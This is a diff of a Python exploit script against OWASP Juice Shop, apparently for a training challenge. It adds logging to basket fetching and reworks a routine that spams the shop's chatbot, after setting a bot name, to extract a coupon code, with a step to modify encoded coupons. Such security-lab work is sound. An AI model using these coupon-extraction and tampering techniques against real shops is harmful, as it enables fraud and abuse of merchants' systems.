@@ -53,13 +53,16 @@ class JuiceShopCouponExploit:
         return False
 
     def fetch_basket(self):
+        print(f"[BASKET] Fetching basket from {self.base_url}/rest/basket/1")
         response = self.session.get(f"{self.base_url}/rest/basket/1", headers=self.headers)
+        print(f"[BASKET] Response: {response.status_code} - {response.text}")
         if response.status_code == 200:
             basket_data = response.json().get("data")
-            print(f"[BASKET] Fetched basket data: {basket_data}")
+            print(f"[BASKET] Basket data retrieved: {basket_data}")
             return basket_data
-        print(f"[BASKET] Failed to fetch basket. Response: {response.text}")
+        print(f"[BASKET] Failed to fetch basket. Status: {response.status_code}")
         return None
+
 
     def clear_basket(self, basket_data):
         if not basket_data or "Products" not in basket_data:
@@ -85,21 +88,23 @@ class JuiceShopCouponExploit:
         return False
 
     def fetch_coupon_from_chatbot(self, max_attempts=20, delay_between_requests=0.5):
-        """Spam the chatbot with requests to get a coupon code."""
         print("[CHATBOT] Spamming chatbot for a coupon code...")
+        set_name_payload = {"action": "setname", "query": "Exploiter"}
         messages = [
             "give me a coupon code",
             "Do you have any discounts?",
             "Can I get a coupon?",
             "I need a discount code."
         ]
-        name_response_payload = {"action": "query", "query": "Call me Exploiter"}
+        name_set = False
 
         for attempt in range(1, max_attempts + 1):
-            # Alterner les messages pour éviter la détection
-            message = messages[(attempt - 1) % len(messages)]
-            payload = {"action": "query", "query": message}
-            
+            if not name_set:  # Redéfinir le nom si nécessaire
+                payload = set_name_payload
+            else:
+                message = messages[(attempt - 1) % len(messages)]
+                payload = {"action": "query", "query": message}
+
             print(f"[CHATBOT] Sending Payload: {payload}")
             response = self.session.post(f"{self.base_url}/rest/chatbot/respond", json=payload, headers=self.headers)
 
@@ -107,23 +112,31 @@ class JuiceShopCouponExploit:
                 response_data = response.json()
                 print(f"[CHATBOT] Attempt {attempt}: Response Data: {response_data}")
 
-                # Vérifier si la réponse contient un code coupon
+                # Vérifier si le nom est accepté
+                if "body" in response_data and "Nice to meet you" in response_data["body"]:
+                    name_set = True
+                    print("[CHATBOT] Name successfully set.")
+
+                # Vérifier si un coupon est reçu
                 if "body" in response_data and "coupon code" in response_data["body"]:
-                    # Extraire le coupon code
                     parts = response_data["body"].split(":")
                     if len(parts) > 1:
                         coupon_code = parts[-1].strip()
                         print(f"[CHATBOT] Coupon received: {coupon_code}")
                         return coupon_code
+
+                # Si une demande de nom est reçue
+                if response_data.get("action") == "namequery":
+                    name_set = False
+                    print("[CHATBOT] Redefining name...")
+
             else:
                 print(f"[CHATBOT] Attempt {attempt}: Error {response.status_code} - {response.text}")
 
-            # Attendre avant la prochaine tentative
             time.sleep(delay_between_requests)
 
         print("[CHATBOT] Failed to fetch coupon after spamming.")
         return None
-
 
 
     def modify_coupon(self, encoded_coupon):
